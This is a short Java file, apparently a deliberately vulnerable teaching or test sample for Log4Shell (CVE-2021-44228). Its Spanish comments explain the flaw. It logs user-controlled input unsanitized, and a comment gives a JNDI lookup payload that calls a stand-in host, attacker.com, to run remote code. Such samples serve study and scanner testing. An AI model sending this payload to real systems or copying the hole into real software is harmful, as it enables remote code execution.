package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * VULNERABLE: Log4Shell (CVE-2021-44228)
 * El logger procesa input del usuario sin sanitizar.
 * Un atacante envia: ${jndi:ldap://attacker.com/exploit}
 * Log4j resuelve el JNDI lookup y ejecuta codigo remoto.
 */
public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        String userAgent = args.length > 0 ? args[0] : "Mozilla/5.0";
        // VULNERABLE: input del usuario va directo al logger
        logger.info("User-Agent: {}", userAgent);
        logger.error("Request from: {}", System.getenv("HTTP_X_FORWARDED_FOR"));
    }
}
